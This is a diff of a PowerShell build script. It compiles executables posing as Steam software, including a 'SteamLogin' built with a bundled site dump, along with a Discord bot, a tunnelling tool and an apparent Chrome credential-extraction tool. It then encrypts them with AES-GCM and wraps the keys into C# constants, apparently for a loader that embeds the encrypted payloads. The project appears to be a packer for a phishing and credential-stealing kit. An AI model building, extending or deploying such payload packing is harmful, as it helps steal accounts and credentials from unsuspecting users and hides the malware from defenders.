@@ -14,49 +14,40 @@ pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data
 pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --noupx --name "discord_bot" "websocket\discord_bot.py"
 pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data "login\steam.ico;." --noupx --name "SteamService" "okoshko\steam_notice.py"
 
-Write-Host "[*] Phase 3: Binary Encryption (AES-256 CBC)..." -ForegroundColor Cyan
-$Aes = [System.Security.Cryptography.Aes]::Create()
-$Aes.GenerateKey()
-$Aes.GenerateIV()
-$KeyBase64 = [System.Convert]::ToBase64String($Aes.Key)
-$IvBase64 = [System.Convert]::ToBase64String($Aes.IV)
+Write-Host "[*] Phase 3: Binary Encryption (AES-GCM AEAD)..." -ForegroundColor Cyan
 
-Write-Host "    [+] Generated dynamic AES Key: $($KeyBase64.Substring(0, 10))..." -ForegroundColor Green
-Write-Host "    [+] Generated dynamic AES IV:  $($IvBase64.Substring(0, 10))..." -ForegroundColor Green
+# 1. Generate Keys
+$MasterKeyBytes = New-Object byte[] 32
+[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($MasterKeyBytes)
+$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKeyBytes)
 
+$SessionKeyBytes = New-Object byte[] 32
+[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($SessionKeyBytes)
+$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKeyBytes)
+
+# 2. Key Wrap (Encrypt SessionKey with MasterKey) via Python
+$EncryptedSessionKeyB64 = (python scripts\encrypt_gcm.py wrap $SessionKeyB64 $MasterKeyB64).Trim()
+
+Write-Host "    [+] Generated Master Key:     $($MasterKeyB64.Substring(0, 10))..." -ForegroundColor Green
+Write-Host "    [+] Encrypted Session Key:    $($EncryptedSessionKeyB64.Substring(0, 10))..." -ForegroundColor DarkGreen
+
+# 3. Update Constants.cs
 $ConstantsPath = "defense\Constants.cs"
 $Content = Get-Content $ConstantsPath -Raw
-$Content = $Content -replace 'public const string RESOURCE_AES_KEY = ".*?";', "public const string RESOURCE_AES_KEY = `"$KeyBase64`";"
-$Content = $Content -replace 'public const string RESOURCE_AES_IV = ".*?";', "public const string RESOURCE_AES_IV = `"$IvBase64`";"
+$Content = $Content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
+$Content = $Content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
 Set-Content $ConstantsPath $Content
 
-function Invoke-AesEncryption {
-    param([string]$FilePath, [string]$KeyBase64, [string]$IvBase64)
-    $Key = [System.Convert]::FromBase64String($KeyBase64)
-    $Iv = [System.Convert]::FromBase64String($IvBase64)
-    $Bytes = [System.IO.File]::ReadAllBytes($FilePath)
-    
-    $AesObj = [System.Security.Cryptography.Aes]::Create()
-    $AesObj.Key = $Key
-    $AesObj.IV = $Iv
-    $AesObj.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $AesObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    
-    $Encryptor = $AesObj.CreateEncryptor()
-    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
-    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedBytes)
-    
-    $Encryptor.Dispose()
-    $AesObj.Dispose()
-}
-
+# 4. Encryption Loop
 $FilesToEncrypt = @("dist\SteamLogin.exe", "dist\discord_bot.exe", "dist\SteamService.exe", "tools\bore.exe", "tools\chromelevator.exe")
 foreach ($file in $FilesToEncrypt) {
     if (Test-Path $file) {
         $binFile = $file -replace "\.exe", ".bin"
         Move-Item -Path $file -Destination $binFile -Force
-        Invoke-AesEncryption -FilePath $binFile -KeyBase64 $KeyBase64 -IvBase64 $IvBase64
-        Write-Host "    [+] AES Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
+        
+        # Use Python GCM Encryption Helper
+        python scripts\encrypt_gcm.py encrypt $binFile $SessionKeyB64
+        Write-Host "    [+] AES-GCM Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
         
         # Sync to root for C# embedding
         $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
